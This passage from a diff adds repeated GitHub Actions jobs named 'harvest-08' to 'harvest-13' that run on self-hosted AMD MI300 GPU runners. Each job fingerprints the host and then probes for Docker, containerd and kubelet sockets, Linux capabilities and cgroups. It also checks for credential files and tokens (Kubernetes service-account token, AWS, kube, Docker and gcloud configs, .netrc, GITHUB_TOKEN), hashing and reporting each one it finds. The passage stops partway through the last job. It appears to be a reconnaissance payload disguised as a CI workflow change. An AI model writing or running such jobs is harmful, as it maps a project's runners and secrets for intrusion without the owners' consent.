+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-07 nonce=$NONCE"
+          exit 0
+  job-mi300x8-08:
+    name: harvest-08
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
+          echo "C211_JOB=job-mi300x8-08 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-08 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-08 nonce=$NONCE"
+          exit 0
+  job-mi300x8-09:
+    name: harvest-09
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
+          echo "C211_JOB=job-mi300x8-09 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-09 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-09 nonce=$NONCE"
+          exit 0
+  job-mi300x8-10:
+    name: harvest-10
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
+          echo "C211_JOB=job-mi300x8-10 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-10 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-10 nonce=$NONCE"
+          exit 0
+  job-mi300x8-11:
+    name: harvest-11
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
+          echo "C211_JOB=job-mi300x8-11 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-11 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-11 nonce=$NONCE"
+          exit 0
+  job-mi300x8-12:
+    name: harvest-12
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
+          echo "C211_JOB=job-mi300x8-12 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-12 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
+            for p in /etc/machine-id /etc/hostname /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.kube/config" "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gh/hosts.yml" /root/.aws/credentials /root/.kube/config /etc/rancher/k3s/k3s.yaml; do
+              if [ -f "$p" ]; then
+                echo "FP_FILE=$p PRESENT size=$(stat -c %s "$p" 2>/dev/null) sha256=$(sha256sum "$p" 2>/dev/null | cut -c1-64)"
+              elif [ -e "$p" ]; then echo "FP_FILE=$p PRESENT_NONFILE"
+              else echo "FP_FILE=$p ABSENT"; fi
+            done
+          else echo FP_TOOL_ABSENT; fi
+          echo "FP_UID=$(id -u) FP_GID=$(id -g)"
+          for k in KUBERNETES_SERVICE_HOST KUBERNETES_SERVICE_PORT AWS_ROLE_ARN AWS_WEB_IDENTITY_TOKEN_FILE AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_REGION GOOGLE_APPLICATION_CREDENTIALS; do
+            eval "v=\${$k:-}"; if [ -n "$v" ]; then echo "FP_ENV $k PRESENT"; else echo "FP_ENV $k ABSENT"; fi
+          done
+          if [ -n "${GITHUB_TOKEN:-}" ]; then echo "FP_ENV GITHUB_TOKEN PRESENT"; else echo "FP_ENV GITHUB_TOKEN ABSENT"; fi
+          echo "C211_PROBE_END job=job-mi300x8-12 nonce=$NONCE"
+          exit 0
+  job-mi300x8-13:
+    name: harvest-13
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 20
+    steps:
+      - name: harvest
+        shell: bash
+        env:
+          NONCE: c211-127264-8e2d07a89b2a780a
+        run: |
+          set -u
+          set +e
+          NONCE='c211-127264-8e2d07a89b2a780a'
+          echo "C211_JOB=job-mi300x8-13 NONCE=$NONCE"
+          echo "C211_MARKER job=job-mi300x8-13 nonce=$NONCE host=$(hostname 2>/dev/null) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ')"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>/dev/null || true)"
+          echo "--- AMD DEVICES (read-only) ---"
+          if [ -e /dev/kfd ]; then echo "KFD_DEV=PRESENT"; else echo "KFD_DEV=ABSENT"; fi
+          ls -l /dev/kfd /dev/dri 2>/dev/null | head -40 || true
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static --asic 2>&1 | head -400 || echo AMD_SMI_ASIC_FAILED
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          if command -v lspci >/dev/null 2>&1; then lspci 2>/dev/null | grep -iE 'amd|ati|instinct|display|3d controller' | head -30 || true; fi
+          echo "--- IDENTITY FINGERPRINT (read-only, presence+sha256 only, no values) ---"
+          echo "SA_TOKEN_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S_SVC_HOST=${KUBERNETES_SERVICE_HOST:+PRESENT} K8S_SVC_PORT=${KUBERNETES_SERVICE_PORT:-none} SA_CA=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/ca.crt ] && echo PRESENT || echo ABSENT) SA_NS_FILE=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/namespace ] && echo PRESENT || echo ABSENT)"
+          echo "CAPPATH=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null || echo CapEff_ABSENT) CAPBND=$(grep -E '^CapBnd:' /proc/self/status 2>/dev/null || true)"
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          echo "SELF_CGROUP=$(cat /proc/self/cgroup 2>/dev/null | head -6 | tr '\n' ';')"
+          for p in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock /etc/kubernetes /var/lib/kubelet /dev/kfd /dev/nvidia0; do
+            if [ -S "$p" ]; then echo "SOCK_PRESENT=$p"
+            elif [ -e "$p" ]; then echo "PATH_PRESENT=$p"
+            else echo "PATH_ABSENT=$p"; fi
+          done
+          if command -v sha256sum >/dev/null 2>&1; then
